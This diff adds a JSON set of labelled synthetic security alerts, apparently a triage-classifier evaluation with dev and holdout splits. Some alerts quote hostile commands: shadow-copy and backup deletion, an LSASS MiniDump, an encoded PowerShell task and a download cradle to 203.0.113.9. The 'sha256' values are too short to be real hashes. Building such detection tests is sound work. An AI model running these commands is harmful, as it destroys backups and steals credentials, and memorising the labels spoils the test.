@@ -1,0 +1,776 @@
+[
+ {
+  "source": "entra_id",
+  "client": "Kaveri Power Distribution",
+  "raw": {
+   "id": "signin-001",
+   "createdDateTime": "2026-11-02T03:10:00Z",
+   "riskEventType": "impossibleTravel",
+   "riskLevel": "high",
+   "userPrincipalName": "r.menon@kaveripower.example",
+   "ipAddress": "198.51.100.23",
+   "riskDetail": "Sign-in from Bucharest RO 12 minutes after a sign-in from Chennai IN.",
+   "host_hint": "KPD-BILL-03"
+  },
+  "label": {
+   "threat": true,
+   "scenario": "ransomware",
+   "split": "dev",
+   "why": ""
+  }
+ },
+ {
+  "source": "crowdstrike_edr",
+  "client": "Kaveri Power Distribution",
+  "raw": {
+   "detection_id": "ldt-002",
+   "created_timestamp": "2026-11-02T03:31:00Z",
+   "name": "Credential dumping via LSASS access",
+   "severity": "high",
+   "hostname": "KPD-BILL-03",
+   "user_name": "r.menon",
+   "description": "Handle opened to lsass.exe with full access by an unsigned binary.",
+   "tactic": "Credential Access",
+   "technique": "LSASS Memory",
+   "filename": "upd.exe",
+   "cmdline": "upd.exe -p lsass"
+  },
+  "label": {
+   "threat": true,
+   "scenario": "ransomware",
+   "split": "dev",
+   "why": ""
+  }
+ },
+ {
+  "source": "crowdstrike_edr",
+  "client": "Kaveri Power Distribution",
+  "raw": {
+   "detection_id": "ldt-003",
+   "created_timestamp": "2026-11-02T03:44:00Z",
+   "name": "Lateral movement via remote service",
+   "severity": "high",
+   "hostname": "KPD-FS-01",
+   "user_name": "r.menon",
+   "description": "Remote service created from KPD-BILL-03 using harvested credentials.",
+   "tactic": "Lateral Movement"
+  },
+  "label": {
+   "threat": true,
+   "scenario": "ransomware",
+   "split": "dev",
+   "why": ""
+  }
+ },
+ {
+  "source": "crowdstrike_edr",
+  "client": "Kaveri Power Distribution",
+  "raw": {
+   "detection_id": "ldt-004",
+   "created_timestamp": "2026-11-02T04:02:00Z",
+   "name": "Ransomware behavior detected",
+   "severity": "critical",
+   "hostname": "KPD-FS-01",
+   "user_name": "r.menon",
+   "description": "Process rapidly encrypting files; shadow copies deleted.",
+   "sha256": "9f2a7d11c0b84e6fa1d35b7e2c904d18",
+   "filename": "svhost.exe",
+   "cmdline": "vssadmin delete shadows /all /quiet",
+   "tactic": "Impact"
+  },
+  "label": {
+   "threat": true,
+   "scenario": "ransomware",
+   "split": "dev",
+   "why": ""
+  }
+ },
+ {
+  "source": "fortinet_fw",
+  "client": "Kaveri Power Distribution",
+  "raw": {
+   "logid": "fg-005",
+   "eventtime": "2026-11-02T04:05:00Z",
+   "attack": "Outbound connection to known C2",
+   "crlevel": "high",
+   "srcip": "KPD-FS-01",
+   "dstip": "203.0.113.150",
+   "msg": "Beaconing pattern to known command and control infrastructure.",
+   "action": "detected",
+   "dstport": "443"
+  },
+  "label": {
+   "threat": true,
+   "scenario": "ransomware",
+   "split": "dev",
+   "why": ""
+  }
+ },
+ {
+  "source": "crowdstrike_edr",
+  "client": "Sundar Hospitals",
+  "raw": {
+   "detection_id": "ldt-006",
+   "created_timestamp": "2026-11-03T22:14:00Z",
+   "name": "Volume shadow copy administration",
+   "severity": "low",
+   "hostname": "SH-PACS-02",
+   "user_name": "svc_backup",
+   "description": "vssadmin invoked by a non-backup parent process.",
+   "cmdline": "vssadmin.exe delete shadows /all /quiet",
+   "filename": "vssadmin.exe"
+  },
+  "label": {
+   "threat": true,
+   "scenario": "ransomware-quiet",
+   "split": "dev",
+   "why": "Shadow-copy deletion is a classic pre-encryption step; no keyword in the title."
+  }
+ },
+ {
+  "source": "crowdstrike_edr",
+  "client": "Sundar Hospitals",
+  "raw": {
+   "detection_id": "ldt-007",
+   "created_timestamp": "2026-11-03T22:15:00Z",
+   "name": "Boot configuration modified",
+   "severity": "low",
+   "hostname": "SH-PACS-02",
+   "user_name": "svc_backup",
+   "description": "bcdedit changed recovery settings.",
+   "cmdline": "bcdedit /set {default} recoveryenabled No",
+   "filename": "bcdedit.exe"
+  },
+  "label": {
+   "threat": true,
+   "scenario": "ransomware-quiet",
+   "split": "dev",
+   "why": "Disabling recovery precedes encryption."
+  }
+ },
+ {
+  "source": "crowdstrike_edr",
+  "client": "Sundar Hospitals",
+  "raw": {
+   "detection_id": "ldt-008",
+   "created_timestamp": "2026-11-03T22:09:00Z",
+   "name": "Scheduled task created",
+   "severity": "low",
+   "hostname": "SH-PACS-02",
+   "user_name": "svc_backup",
+   "description": "New scheduled task runs an encoded PowerShell command at logon.",
+   "cmdline": "schtasks /create /tn Updater /tr \"powershell -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA\" /sc onlogon"
+  },
+  "label": {
+   "threat": true,
+   "scenario": "ransomware-quiet",
+   "split": "holdout",
+   "why": "Persistence with an encoded download cradle."
+  }
+ },
+ {
+  "source": "crowdstrike_edr",
+  "client": "Sundar Hospitals",
+  "raw": {
+   "detection_id": "ldt-009",
+   "created_timestamp": "2026-11-03T22:18:00Z",
+   "name": "Backup catalog removed",
+   "severity": "medium",
+   "hostname": "SH-BKP-01",
+   "user_name": "svc_backup",
+   "description": "wbadmin removed the backup catalog.",
+   "cmdline": "wbadmin delete catalog -quiet",
+   "filename": "wbadmin.exe"
+  },
+  "label": {
+   "threat": true,
+   "scenario": "ransomware-quiet",
+   "split": "holdout",
+   "why": "Destroying backups before impact."
+  }
+ },
+ {
+  "source": "entra_id",
+  "client": "Ganga Finserv",
+  "raw": {
+   "id": "signin-010",
+   "createdDateTime": "2026-11-04T06:02:00Z",
+   "riskEventType": "anonymizedIPAddress",
+   "riskLevel": "medium",
+   "userPrincipalName": "a.iyer@gangafin.example",
+   "ipAddress": "192.0.2.77",
+   "riskDetail": "Sign-in from an anonymising proxy after the user clicked a link in an email."
+  },
+  "label": {
+   "threat": true,
+   "scenario": "phish-ato",
+   "split": "dev",
+   "why": ""
+  }
+ },
+ {
+  "source": "entra_id",
+  "client": "Ganga Finserv",
+  "raw": {
+   "id": "signin-011",
+   "createdDateTime": "2026-11-04T06:09:00Z",
+   "riskEventType": "New inbox rule",
+   "riskLevel": "low",
+   "userPrincipalName": "a.iyer@gangafin.example",
+   "ipAddress": "192.0.2.77",
+   "riskDetail": "Inbox rule created: forward all mail containing 'invoice' to an external address and delete."
+  },
+  "label": {
+   "threat": true,
+   "scenario": "phish-ato",
+   "split": "dev",
+   "why": "Classic business-email-compromise step, reported at low severity."
+  }
+ },
+ {
+  "source": "entra_id",
+  "client": "Ganga Finserv",
+  "raw": {
+   "id": "signin-012",
+   "createdDateTime": "2026-11-04T06:11:00Z",
+   "riskEventType": "MFA method registered",
+   "riskLevel": "low",
+   "userPrincipalName": "a.iyer@gangafin.example",
+   "ipAddress": "192.0.2.77",
+   "riskDetail": "New authenticator app registered from a device not seen before."
+  },
+  "label": {
+   "threat": true,
+   "scenario": "phish-ato",
+   "split": "dev",
+   "why": "Attacker adding their own second factor."
+  }
+ },
+ {
+  "source": "entra_id",
+  "client": "Ganga Finserv",
+  "raw": {
+   "id": "signin-013",
+   "createdDateTime": "2026-11-04T06:20:00Z",
+   "riskEventType": "Mass file download",
+   "riskLevel": "medium",
+   "userPrincipalName": "a.iyer@gangafin.example",
+   "ipAddress": "192.0.2.77",
+   "riskDetail": "412 files downloaded from the finance SharePoint site in 6 minutes."
+  },
+  "label": {
+   "threat": true,
+   "scenario": "phish-ato",
+   "split": "holdout",
+   "why": ""
+  }
+ },
+ {
+  "source": "entra_id",
+  "client": "Ganga Finserv",
+  "raw": {
+   "id": "signin-014",
+   "createdDateTime": "2026-11-04T06:25:00Z",
+   "riskEventType": "OAuth application consent",
+   "riskLevel": "low",
+   "userPrincipalName": "a.iyer@gangafin.example",
+   "ipAddress": "192.0.2.77",
+   "riskDetail": "User granted Mail.ReadWrite and offline_access to an unverified app."
+  },
+  "label": {
+   "threat": true,
+   "scenario": "phish-ato",
+   "split": "holdout",
+   "why": "Illicit consent grant."
+  }
+ },
+ {
+  "source": "entra_id",
+  "client": "Narmada Textiles",
+  "raw": {
+   "id": "signin-015",
+   "createdDateTime": "2026-11-05T01:00:00Z",
+   "riskEventType": "passwordSpray",
+   "riskLevel": "high",
+   "userPrincipalName": "multiple",
+   "ipAddress": "198.51.100.91",
+   "riskDetail": "Failed sign-ins across 30 accounts from one external IP in 10 minutes."
+  },
+  "label": {
+   "threat": true,
+   "scenario": "brute",
+   "split": "dev",
+   "why": ""
+  }
+ },
+ {
+  "source": "fortinet_fw",
+  "client": "Narmada Textiles",
+  "raw": {
+   "logid": "fg-016",
+   "eventtime": "2026-11-05T01:04:00Z",
+   "attack": "SSH brute force",
+   "crlevel": "medium",
+   "srcip": "198.51.100.91",
+   "dstip": "NT-VPN-01",
+   "msg": "250 failed SSH logins in 5 minutes from a single source.",
+   "action": "detected",
+   "dstport": "22"
+  },
+  "label": {
+   "threat": true,
+   "scenario": "brute",
+   "split": "dev",
+   "why": ""
+  }
+ },
+ {
+  "source": "entra_id",
+  "client": "Narmada Textiles",
+  "raw": {
+   "id": "signin-017",
+   "createdDateTime": "2026-11-05T01:12:00Z",
+   "riskEventType": "Successful sign-in after repeated failures",
+   "riskLevel": "medium",
+   "userPrincipalName": "k.rao@narmadatex.example",
+   "ipAddress": "198.51.100.91",
+   "riskDetail": "Sign-in succeeded from the IP that produced 40 failures."
+  },
+  "label": {
+   "threat": true,
+   "scenario": "brute",
+   "split": "dev",
+   "why": ""
+  }
+ },
+ {
+  "source": "entra_id",
+  "client": "Narmada Textiles",
+  "raw": {
+   "id": "signin-018",
+   "createdDateTime": "2026-11-05T01:20:00Z",
+   "riskEventType": "Privileged role assigned",
+   "riskLevel": "low",
+   "userPrincipalName": "k.rao@narmadatex.example",
+   "ipAddress": "198.51.100.91",
+   "riskDetail": "Global Administrator role assigned to a newly created account."
+  },
+  "label": {
+   "threat": true,
+   "scenario": "brute",
+   "split": "holdout",
+   "why": "Privilege gain right after a brute-forced login, at low severity."
+  }
+ },
+ {
+  "source": "crowdstrike_edr",
+  "client": "Kaveri Power Distribution",
+  "raw": {
+   "detection_id": "ldt-019",
+   "created_timestamp": "2026-11-06T02:30:00Z",
+   "name": "Remote service creation",
+   "severity": "high",
+   "hostname": "KPD-DC-01",
+   "user_name": "svc_sccm",
+   "description": "Service installed remotely from a workstation; binary named sccm_update.exe.",
+   "cmdline": "psexesvc.exe",
+   "filename": "sccm_update.exe"
+  },
+  "label": {
+   "threat": true,
+   "scenario": "allowlist-abuse",
+   "split": "dev",
+   "why": "The text mentions SCCM, but the target is a domain controller and the source is a workstation."
+  }
+ },
+ {
+  "source": "crowdstrike_edr",
+  "client": "Kaveri Power Distribution",
+  "raw": {
+   "detection_id": "ldt-020",
+   "created_timestamp": "2026-11-06T02:41:00Z",
+   "name": "Process memory dump",
+   "severity": "medium",
+   "hostname": "KPD-ENG-11",
+   "user_name": "t.pillai",
+   "description": "rundll32 wrote a memory dump file to a CyberArk folder.",
+   "cmdline": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\CyberArk\\out.dmp full"
+  },
+  "label": {
+   "threat": true,
+   "scenario": "allowlist-abuse",
+   "split": "dev",
+   "why": "comsvcs MiniDump is a credential-theft technique; the path only looks like CyberArk."
+  }
+ },
+ {
+  "source": "crowdstrike_edr",
+  "client": "Kaveri Power Distribution",
+  "raw": {
+   "detection_id": "ldt-021",
+   "created_timestamp": "2026-11-06T02:44:00Z",
+   "name": "Suspicious PowerShell execution",
+   "severity": "medium",
+   "hostname": "KPD-ENG-11",
+   "user_name": "t.pillai",
+   "description": "PowerShell launched from a folder named HP SoftPaq and contacted an external address.",
+   "cmdline": "powershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://203.0.113.9/a')\""
+  },
+  "label": {
+   "threat": true,
+   "scenario": "allowlist-abuse",
+   "split": "holdout",
+   "why": ""
+  }
+ },
+ {
+  "source": "crowdstrike_edr",
+  "client": "Ganga Finserv",
+  "raw": {
+   "detection_id": "ldt-022",
+   "created_timestamp": "2026-11-04T01:00:00Z",
+   "name": "Known admin tool: 1E Tachyon agent",
+   "severity": "low",
+   "hostname": "GF-WKS-04",
+   "user_name": "SYSTEM",
+   "description": "1E Tachyon agent performing routine scheduled software inventory.",
+   "cmdline": "TachyonAgent.exe --inventory",
+   "filename": "TachyonAgent.exe"
+  },
+  "label": {
+   "threat": false,
+   "scenario": "admin-noise",
+   "split": "dev",
+   "why": ""
+  }
+ },
+ {
+  "source": "crowdstrike_edr",
+  "client": "Ganga Finserv",
+  "raw": {
+   "detection_id": "ldt-023",
+   "created_timestamp": "2026-11-04T02:00:00Z",
+   "name": "Known admin tool: 1E Tachyon agent",
+   "severity": "low",
+   "hostname": "GF-WKS-09",
+   "user_name": "SYSTEM",
+   "description": "1E Tachyon agent performing routine scheduled software inventory.",
+   "cmdline": "TachyonAgent.exe --inventory",
+   "filename": "TachyonAgent.exe"
+  },
+  "label": {
+   "threat": false,
+   "scenario": "admin-noise",
+   "split": "dev",
+   "why": ""
+  }
+ },
+ {
+  "source": "crowdstrike_edr",
+  "client": "Ganga Finserv",
+  "raw": {
+   "detection_id": "ldt-024",
+   "created_timestamp": "2026-11-04T03:00:00Z",
+   "name": "Known admin tool: 1E Tachyon agent",
+   "severity": "low",
+   "hostname": "GF-WKS-15",
+   "user_name": "SYSTEM",
+   "description": "1E Tachyon agent performing routine scheduled software inventory.",
+   "cmdline": "TachyonAgent.exe --inventory",
+   "filename": "TachyonAgent.exe"
+  },
+  "label": {
+   "threat": false,
+   "scenario": "admin-noise",
+   "split": "dev",
+   "why": ""
+  }
+ },
+ {
+  "source": "crowdstrike_edr",
+  "client": "Ganga Finserv",
+  "raw": {
+   "detection_id": "ldt-025",
+   "created_timestamp": "2026-11-04T04:00:00Z",
+   "name": "Known admin tool: 1E Tachyon agent",
+   "severity": "low",
+   "hostname": "GF-WKS-22",
+   "user_name": "SYSTEM",
+   "description": "1E Tachyon agent performing routine scheduled software inventory.",
+   "cmdline": "TachyonAgent.exe --inventory",
+   "filename": "TachyonAgent.exe"
+  },
+  "label": {
+   "threat": false,
+   "scenario": "admin-noise",
+   "split": "holdout",
+   "why": ""
+  }
+ },
+ {
+  "source": "crowdstrike_edr",
+  "client": "Ganga Finserv",
+  "raw": {
+   "detection_id": "ldt-026",
+   "created_timestamp": "2026-11-04T05:00:00Z",
+   "name": "Known admin tool: 1E Tachyon agent",
+   "severity": "low",
+   "hostname": "GF-WKS-31",
+   "user_name": "SYSTEM",
+   "description": "1E Tachyon agent performing routine scheduled software inventory.",
+   "cmdline": "TachyonAgent.exe --inventory",
+   "filename": "TachyonAgent.exe"
+  },
+  "label": {
+   "threat": false,
+   "scenario": "admin-noise",
+   "split": "holdout",
+   "why": ""
+  }
+ },
+ {
+  "source": "crowdstrike_edr",
+  "client": "Ganga Finserv",
+  "raw": {
+   "detection_id": "ldt-027",
+   "created_timestamp": "2026-11-04T09:00:00Z",
+   "name": "HP SoftPaq driver update flagged",
+   "severity": "low",
+   "hostname": "GF-WKS-09",
+   "user_name": "SYSTEM",
+   "description": "HP SoftPaq download manager updating drivers.",
+   "cmdline": "HPSoftPaqDownloadManager.exe",
+   "filename": "HPSoftPaqDownloadManager.exe"
+  },
+  "label": {
+   "threat": false,
+   "scenario": "admin-noise",
+   "split": "dev",
+   "why": ""
+  }
+ },
+ {
+  "source": "crowdstrike_edr",
+  "client": "Ganga Finserv",
+  "raw": {
+   "detection_id": "ldt-028",
+   "created_timestamp": "2026-11-04T10:00:00Z",
+   "name": "Suspicious PowerShell execution",
+   "severity": "medium",
+   "hostname": "GF-PAW-01",
+   "user_name": "d.shah",
+   "description": "CyberArk PSM dispatcher launching PowerShell for privileged session management.",
+   "cmdline": "powershell.exe -File C:\\CyberArk\\PSM\\Components\\dispatch.ps1",
+   "filename": "powershell.exe"
+  },
+  "label": {
+   "threat": false,
+   "scenario": "admin-noise",
+   "split": "dev",
+   "why": ""
+  }
+ },
+ {
+  "source": "fortinet_fw",
+  "client": "Ganga Finserv",
+  "raw": {
+   "logid": "fg-029",
+   "eventtime": "2026-11-04T10:05:00Z",
+   "attack": "Traffic allowed",
+   "crlevel": "low",
+   "srcip": "10.20.5.20",
+   "dstip": "8.8.8.8",
+   "msg": "Routine outbound HTTPS to public DNS resolver.",
+   "action": "accept"
+  },
+  "label": {
+   "threat": false,
+   "scenario": "admin-noise",
+   "split": "dev",
+   "why": ""
+  }
+ },
+ {
+  "source": "fortinet_fw",
+  "client": "Ganga Finserv",
+  "raw": {
+   "logid": "fg-030",
+   "eventtime": "2026-11-04T10:06:00Z",
+   "attack": "Traffic allowed",
+   "crlevel": "low",
+   "srcip": "10.20.5.31",
+   "dstip": "10.20.1.10",
+   "msg": "Internal file-share access.",
+   "action": "accept"
+  },
+  "label": {
+   "threat": false,
+   "scenario": "admin-noise",
+   "split": "holdout",
+   "why": ""
+  }
+ },
+ {
+  "source": "crowdstrike_edr",
+  "client": "Sundar Hospitals",
+  "raw": {
+   "detection_id": "ldt-031",
+   "created_timestamp": "2026-11-03T08:00:00Z",
+   "name": "Disk encryption enabled",
+   "severity": "low",
+   "hostname": "SH-LAP-07",
+   "user_name": "SYSTEM",
+   "description": "BitLocker encryption turned on by device-management policy.",
+   "cmdline": "manage-bde -on C:",
+   "filename": "manage-bde.exe"
+  },
+  "label": {
+   "threat": false,
+   "scenario": "word-trap",
+   "split": "dev",
+   "why": "Contains 'encrypt' but is routine policy."
+  }
+ },
+ {
+  "source": "fortinet_fw",
+  "client": "Sundar Hospitals",
+  "raw": {
+   "logid": "fg-032",
+   "eventtime": "2026-11-03T08:05:00Z",
+   "attack": "Traffic allowed",
+   "crlevel": "low",
+   "srcip": "10.40.2.14",
+   "dstip": "EC2-APP-01",
+   "msg": "Routine HTTPS to the cloud application server.",
+   "action": "accept"
+  },
+  "label": {
+   "threat": false,
+   "scenario": "word-trap",
+   "split": "dev",
+   "why": "Hostname EC2-APP-01 contains the letters 'c2'."
+  }
+ },
+ {
+  "source": "crowdstrike_edr",
+  "client": "Sundar Hospitals",
+  "raw": {
+   "detection_id": "ldt-033",
+   "created_timestamp": "2026-11-03T08:10:00Z",
+   "name": "Software inventory scan",
+   "severity": "low",
+   "hostname": "SH-WKS-21",
+   "user_name": "SYSTEM",
+   "description": "Routine inventory of installed software.",
+   "sha256": "4bc2a09e77d1f3c2aa5b6e0d9c81f2b7",
+   "cmdline": "TachyonAgent.exe --inventory",
+   "filename": "TachyonAgent.exe"
+  },
+  "label": {
+   "threat": false,
+   "scenario": "word-trap",
+   "split": "dev",
+   "why": "The file hash happens to contain 'c2'."
+  }
+ },
+ {
+  "source": "fortinet_fw",
+  "client": "Sundar Hospitals",
+  "raw": {
+   "logid": "fg-034",
+   "eventtime": "2026-11-03T23:00:00Z",
+   "attack": "Traffic allowed",
+   "crlevel": "low",
+   "srcip": "10.40.2.30",
+   "dstip": "10.40.9.5",
+   "msg": "Nightly backup: files encrypted in transit to the backup server.",
+   "action": "accept"
+  },
+  "label": {
+   "threat": false,
+   "scenario": "word-trap",
+   "split": "holdout",
+   "why": ""
+  }
+ },
+ {
+  "source": "entra_id",
+  "client": "Sundar Hospitals",
+  "raw": {
+   "id": "signin-035",
+   "createdDateTime": "2026-11-03T09:00:00Z",
+   "riskEventType": "Password changed",
+   "riskLevel": "low",
+   "userPrincipalName": "n.george@sundarhosp.example",
+   "ipAddress": "10.40.3.8",
+   "riskDetail": "User changed their own password from the office network after the 90-day expiry notice."
+  },
+  "label": {
+   "threat": false,
+   "scenario": "word-trap",
+   "split": "holdout",
+   "why": ""
+  }
+ },
+ {
+  "source": "crowdstrike_edr",
+  "client": "Sundar Hospitals",
+  "raw": {
+   "detection_id": "ldt-036",
+   "created_timestamp": "2026-11-03T09:30:00Z",
+   "name": "Software update installed",
+   "severity": "low",
+   "hostname": "SH-WKS-30",
+   "user_name": "SYSTEM",
+   "description": "Vendor update for the command and control room display software.",
+   "filename": "DisplayWallUpdate.exe",
+   "cmdline": "DisplayWallUpdate.exe /s"
+  },
+  "label": {
+   "threat": false,
+   "scenario": "word-trap",
+   "split": "holdout",
+   "why": "'command and control' used in its plain-English sense."
+  }
+ },
+ {
+  "source": "fortinet_fw",
+  "client": "Narmada Textiles",
+  "raw": {
+   "logid": "fg-037",
+   "eventtime": "2026-11-05T11:00:00Z",
+   "attack": "SQL injection attempt",
+   "crlevel": "high",
+   "srcip": "192.0.2.200",
+   "dstip": "NT-WEB-01",
+   "msg": "WAF blocked SQL injection attempt against the supplier portal login.",
+   "action": "blocked"
+  },
+  "label": {
+   "threat": null,
+   "scenario": "ambiguous",
+   "split": "dev",
+   "why": "Blocked attempt; reasonable to escalate or log."
+  }
+ },
+ {
+  "source": "fortinet_fw",
+  "client": "Narmada Textiles",
+  "raw": {
+   "logid": "fg-038",
+   "eventtime": "2026-11-05T11:30:00Z",
+   "attack": "Port scan detected",
+   "crlevel": "medium",
+   "srcip": "192.0.2.201",
+   "dstip": "NT-DMZ-01",
+   "msg": "Sequential port probing from an external host.",
+   "action": "detected"
+  },
+  "label": {
+   "threat": null,
+   "scenario": "ambiguous",
+   "split": "dev",
+   "why": "Internet background noise unless followed by more."
+  }
+ }
+]
